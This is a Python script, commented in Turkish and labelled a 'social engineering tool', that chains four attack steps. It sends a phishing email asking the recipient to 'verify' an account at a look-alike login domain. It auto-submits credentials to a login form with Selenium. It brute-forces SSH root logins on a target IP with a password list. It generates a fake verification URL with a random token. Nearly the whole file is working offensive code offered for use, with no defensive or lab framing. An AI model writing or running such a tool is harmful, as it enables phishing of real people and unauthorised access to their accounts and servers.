import smtplib
from email.mime.text import MIMEText
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import paramiko
import random

# 1. Sahte E-posta Gönderimi
def send_fake_email(to_email, subject, body):
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    sender_email = "your_email@gmail.com"
    sender_password = "your_password"

    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = sender_email
    msg['To'] = to_email

    try:
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, msg.as_string())
        print(f"E-posta başarıyla gönderildi: {to_email}")
    except Exception as e:
        print(f"E-posta gönderimi başarısız: {e}")
    finally:
        server.quit()

# 2. Web Formu Otomasyonu
def simulate_web_form(url, username, password):
    driver = webdriver.Chrome()  # ChromeDriver yüklü olmalı
    driver.get(url)

    try:
        username_input = driver.find_element(By.NAME, "username")
        username_input.send_keys(username)

        password_input = driver.find_element(By.NAME, "password")
        password_input.send_keys(password)

        password_input.send_keys(Keys.RETURN)
        print("Form dolduruldu ve gönderildi!")
    except Exception as e:
        print(f"Form doldurma başarısız: {e}")
    finally:
        driver.quit()

# 3. SSH Brute Force Denemesi
def ssh_brute_force(target_ip, username, password_list):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target_ip, username=username, password=password)
            print(f"Giriş başarılı! Şifre: {password}")
            return password
        except paramiko.AuthenticationException:
            print(f"Başarısız giriş: {password}")
        finally:
            ssh.close()
    return None

# 4. Sahte URL Üretimi
def create_fake_url(domain, path):
    fake_url = f"https://{domain}/{path}"
    print(f"Sahte URL oluşturuldu: {fake_url}")
    return fake_url

# Ana Fonksiyon: Hepsini Birleştir
def main():
    print("Sosyal Mühendislik Aracı Başlatılıyor...")

    # 1. Sahte E-posta Gönderimi
    send_fake_email(
        to_email="target_email@example.com",
        subject="Hesap Güvenliği",
        body="Hesabınızı doğrulamak için şu bağlantıya tıklayın: https://secure-login.com/verify"
    )

    # 2. Web Formu Otomasyonu
    simulate_web_form(
        url="https://example.com/login",
        username="fake_user",
        password="fake_password"
    )

    # 3. SSH Brute Force
    passwords = ["12345", "password", "admin"]  # Şifre listesi
    ssh_brute_force("192.168.1.1", "root", passwords)

    # 4. Sahte URL Üretimi
    create_fake_url("secure-login.com", "verify?token=" + str(random.randint(100000, 999999)))

# Çalıştır
if __name__ == "__main__":
    main()